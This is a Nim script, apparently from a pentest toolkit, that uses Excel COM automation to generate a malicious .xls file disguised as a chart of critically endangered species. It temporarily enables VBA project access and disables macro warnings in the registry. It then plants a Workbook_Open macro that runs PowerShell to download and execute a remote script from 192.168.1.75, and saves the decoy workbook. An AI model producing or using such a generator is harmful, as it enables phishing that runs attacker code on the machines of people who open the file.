import winim/com
import strformat

comScript:
  var objExcel = CreateObject("Excel.Application")
  var WshShell = CreateObject("WScript.Shell")
  var Application_Version = objExcel.Version
  

  var strVBOMRegPath = fmt"HKEY_CURRENT_USER\Software\Microsoft\Office\{Application_Version}\Excel\Security\AccessVBOM"
  var strVBAWarnRegPath = fmt"HKEY_CURRENT_USER\Software\Microsoft\Office\{Application_Version}\Excel\Security\VBAWarnings"
  WshShell.RegWrite(strVBOMRegPath, 1, "REG_DWORD")
  WshShell.RegWrite(strVBAWarnRegPath, 1, "REG_DWORD")

  objExcel.visible = true
  objExcel.sheetsInNewWorkBook = 1
  objExcel.displayalerts = false

  var objWorkbook = objExcel.workbooks.add()
  var xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
  var strMacroRevShell = """Sub Workbook_Open()
Call Shell("cmd.exe /c powershell.exe IEX(IWR -uri 'http://192.168.1.75:443/getit.txt')", 1)
End Sub"""
  xlmodule.CodeModule.AddFromString(strMacroRevShell)
  objExcel.activeSheet.name = "Critically Endangered"

  

  for i, j in ["Mammals", "Birds", "Reptiles", "Fishes", "Plants"]:
    objExcel.activeSheet.cells(1, i + 1) = j # this line needs comScript macro

  for cell in objExcel.activeSheet.range("A1:E1"):
    cell.interior.color = RGB(0xee, 0xdd, 0x82)
    cell.interior.pattern = 1
    cell.font.size = 13
    cell.borders.color = RGB(0, 0, 0)
    cell.borders.lineStyle = 1
    cell.borders.weight = 2

  var sheet = objExcel.activeSheet
  sheet.range("A2").value = 184
  sheet.range("B2").value = 182
  sheet.range("C2").value = 57
  sheet.range("D2").value = 162
  sheet.range("E2").value = 1276

  sheet.range("A4:E4").merge()
  sheet.range("A4").value = "Source: IUCN Red List 2003"
  sheet.range("A1:E2").borderAround(1, 2, nil.variant, RGB(0, 0, 0))

  sheet.columns("A:E").columnWidth = 12.5

  var xrange = objExcel.activeSheet.range("A1:E2")
  var xchart = objWorkbook.charts.add()
  xchart.chartWizard(xrange, -4100, 7, 1, 1, 0, false, "Critically Endangered Plants and Animals")
  xchart.HasAxis(3) = false
  var fn = r"D:\Dev369\NimForPentest\test.xls"
  objWorkbook.SaveAs(fn,FileFormat:=56,Password:=0,WriteResPassword:=0,ReadOnlyRecommended:=0,CreateBackup:=0,AccessMode:=1,ConflictResolution:=3,AddToMru:=0,TextCodepage:=0,TextVisualLayout:=0,Local:=0)
  WshShell.RegWrite(strVBOMRegPath, 0, "REG_DWORD")
  WshShell.RegWrite(strVBAWarnRegPath, 0, "REG_DWORD")
  COM_FullRelease() # make sure excel.exe will end it self